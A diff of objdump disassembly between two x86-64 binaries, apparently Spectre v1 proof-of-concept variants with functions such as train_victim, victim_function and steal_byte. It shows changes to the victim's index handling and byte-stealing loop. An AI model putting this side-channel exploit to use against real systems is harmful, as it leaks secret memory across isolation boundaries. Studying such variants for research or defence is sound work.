@@ -1,5 +1,5 @@
 
-spectre8:     file format elf64-x86-64
+spectre14:     file format elf64-x86-64
 
 
 Disassembly of section .interp:
@@ -47,19 +47,14 @@ Disassembly of section .note.gnu.build-id:
  27e:	00 00                	add    %al,(%rax)
  280:	47                   	rex.RXB
  281:	4e 55                	rex.WRX push %rbp
- 283:	00 d1                	add    %dl,%cl
- 285:	5d                   	pop    %rbp
- 286:	9f                   	lahf   
- 287:	26 47 f1             	es rex.RXB icebp 
- 28a:	8a d8                	mov    %al,%bl
- 28c:	75 87                	jne    215 <_init-0x34b>
- 28e:	e0 0a                	loopne 29a <_init-0x2c6>
- 290:	96                   	xchg   %eax,%esi
- 291:	58                   	pop    %rax
- 292:	97                   	xchg   %eax,%edi
- 293:	e0 a1                	loopne 236 <_init-0x32a>
- 295:	72 7e                	jb     315 <_init-0x24b>
- 297:	43                   	rex.XB
+ 283:	00 31                	add    %dh,(%rcx)
+ 285:	4d ac                	rex.WRB lods %ds:(%rsi),%al
+ 287:	b9 90 c2 7b d8       	mov    $0xd87bc290,%ecx
+ 28c:	d9 03                	flds   (%rbx)
+ 28e:	be d1 f6 7b fa       	mov    $0xfa7bf6d1,%esi
+ 293:	d0 02                	rolb   (%rdx)
+ 295:	50                   	push   %rax
+ 296:	d8 c7                	fadd   %st(7),%st
 
 Disassembly of section .gnu.hash:
 
@@ -532,7 +527,7 @@ Disassembly of section .text:
  7e7:	48 89 e5             	mov    %rsp,%rbp
  7ea:	53                   	push   %rbx
  7eb:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
- 7ef:	c7 45 ec 02 00 00 00 	movl   $0x2,-0x14(%rbp)
+ 7ef:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
  7f6:	eb 5a                	jmp    852 <find_cached_index+0x6c>
  7f8:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
  7ff:	00 
@@ -632,7 +627,7 @@ Disassembly of section .text:
  91a:	89 ca                	mov    %ecx,%edx
  91c:	48 63 c2             	movslq %edx,%rax
  91f:	48 89 c7             	mov    %rax,%rdi
- 922:	e8 d9 00 00 00       	callq  a00 <victim_function>
+ 922:	e8 db 00 00 00       	callq  a02 <victim_function>
  927:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
  92e:	eb 1a                	jmp    94a <train_victim+0x62>
  930:	8b 45 f8             	mov    -0x8(%rbp),%eax
@@ -676,39 +671,40 @@ Disassembly of section .text:
  9b1:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  9b5:	89 75 e4             	mov    %esi,-0x1c(%rbp)
  9b8:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
- 9bf:	eb 27                	jmp    9e8 <steal_byte+0x3f>
+ 9bf:	eb 29                	jmp    9ea <steal_byte+0x41>
  9c1:	b8 00 00 00 00       	mov    $0x0,%eax
  9c6:	e8 1d ff ff ff       	callq  8e8 <train_victim>
  9cb:	8b 45 e4             	mov    -0x1c(%rbp),%eax
- 9ce:	48 98                	cltq   
- 9d0:	48 89 c7             	mov    %rax,%rdi
- 9d3:	e8 28 00 00 00       	callq  a00 <victim_function>
- 9d8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
- 9dc:	48 89 c7             	mov    %rax,%rdi
- 9df:	e8 02 fe ff ff       	callq  7e6 <find_cached_index>
- 9e4:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
- 9e8:	81 7d fc e7 03 00 00 	cmpl   $0x3e7,-0x4(%rbp)
- 9ef:	7e d0                	jle    9c1 <steal_byte+0x18>
- 9f1:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
- 9f5:	48 89 c7             	mov    %rax,%rdi
- 9f8:	e8 62 fe ff ff       	callq  85f <find_highest_score>
- 9fd:	90                   	nop
- 9fe:	c9                   	leaveq 
- 9ff:	c3                   	retq   
+ 9ce:	34 ff                	xor    $0xff,%al
+ 9d0:	48 98                	cltq   
+ 9d2:	48 89 c7             	mov    %rax,%rdi
+ 9d5:	e8 28 00 00 00       	callq  a02 <victim_function>
+ 9da:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
+ 9de:	48 89 c7             	mov    %rax,%rdi
+ 9e1:	e8 00 fe ff ff       	callq  7e6 <find_cached_index>
+ 9e6:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
+ 9ea:	81 7d fc e7 03 00 00 	cmpl   $0x3e7,-0x4(%rbp)
+ 9f1:	7e ce                	jle    9c1 <steal_byte+0x18>
+ 9f3:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
+ 9f7:	48 89 c7             	mov    %rax,%rdi
+ 9fa:	e8 60 fe ff ff       	callq  85f <find_highest_score>
+ 9ff:	90                   	nop
+ a00:	c9                   	leaveq 
+ a01:	c3                   	retq   
 
-0000000000000a00 <victim_function>:
- a00:	55                   	push   %rbp
- a01:	48 89 e5             	mov    %rsp,%rbp
- a04:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
- a08:	8b 05 12 06 20 00    	mov    0x200612(%rip),%eax        # 201020 <bufferSize>
- a0e:	48 98                	cltq   
- a10:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
- a14:	73 06                	jae    a1c <victim_function+0x1c>
- a16:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
- a1a:	eb 05                	jmp    a21 <victim_function+0x21>
- a1c:	b8 00 00 00 00       	mov    $0x0,%eax
- a21:	48 8d 15 18 06 20 00 	lea    0x200618(%rip),%rdx        # 201040 <buffer>
- a28:	0f b6 04 10          	movzbl (%rax,%rdx,1),%eax
+0000000000000a02 <victim_function>:
+ a02:	55                   	push   %rbp
+ a03:	48 89 e5             	mov    %rsp,%rbp
+ a06:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
+ a0a:	8b 05 10 06 20 00    	mov    0x200610(%rip),%eax        # 201020 <bufferSize>
+ a10:	48 98                	cltq   
+ a12:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
+ a16:	73 37                	jae    a4f <victim_function+0x4d>
+ a18:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+ a1c:	34 ff                	xor    $0xff,%al
+ a1e:	48 89 c2             	mov    %rax,%rdx
+ a21:	48 8d 05 18 06 20 00 	lea    0x200618(%rip),%rax        # 201040 <buffer>
+ a28:	0f b6 04 02          	movzbl (%rdx,%rax,1),%eax
  a2c:	0f b6 c0             	movzbl %al,%eax
  a2f:	c1 e0 0c             	shl    $0xc,%eax
  a32:	48 63 d0             	movslq %eax,%rdx
@@ -839,7 +835,7 @@ Disassembly of section .eh_frame_hdr:
  b5a:	ff                   	(bad)  
  b5b:	ff 70 01             	pushq  0x1(%rax)
  b5e:	00 00                	add    %al,(%rax)
- b60:	ec                   	in     (%dx),%al
+ b60:	ee                   	out    %al,(%dx)
  b61:	fe                   	(bad)  
  b62:	ff                   	(bad)  
  b63:	ff 94 01 00 00 4c ff 	callq  *-0xb40000(%rcx,%rax,1)
@@ -958,13 +954,12 @@ Disassembly of section .eh_frame:
  c86:	00 00                	add    %al,(%rax)
  c88:	e0 00                	loopne c8a <__GNU_EH_FRAME_HDR+0x176>
  c8a:	00 00                	add    %al,(%rax)
- c8c:	1d fd ff ff 57       	sbb    $0x57fffffd,%eax
+ c8c:	1d fd ff ff 59       	sbb    $0x59fffffd,%eax
  c91:	00 00                	add    %al,(%rax)
  c93:	00 00                	add    %al,(%rax)
  c95:	41 0e                	rex.B (bad) 
  c97:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
- c9d:	02 52 0c             	add    0xc(%rdx),%dl
- ca0:	07                   	(bad)  
+ c9d:	02 54 0c 07          	add    0x7(%rsp,%rcx,1),%dl
  ca1:	08 00                	or     %al,(%rax)
  ca3:	00 00                	add    %al,(%rax)
  ca5:	00 00                	add    %al,(%rax)
@@ -972,14 +967,14 @@ Disassembly of section .eh_frame:
  caa:	00 00                	add    %al,(%rax)
  cac:	04 01                	add    $0x1,%al
  cae:	00 00                	add    %al,(%rax)
- cb0:	50                   	push   %rax
+ cb0:	52                   	push   %rdx
  cb1:	fd                   	std    
  cb2:	ff                   	(bad)  
- cb3:	ff 52 00             	callq  *0x0(%rdx)
+ cb3:	ff 50 00             	callq  *0x0(%rax)
  cb6:	00 00                	add    %al,(%rax)
  cb8:	00 41 0e             	add    %al,0xe(%rcx)
  cbb:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
- cc1:	02 4d 0c             	add    0xc(%rbp),%cl
+ cc1:	02 4b 0c             	add    0xc(%rbx),%cl
  cc4:	07                   	(bad)  
  cc5:	08 00                	or     %al,(%rax)
  cc7:	00 44 00 00          	add    %al,0x0(%rax,%rax,1)
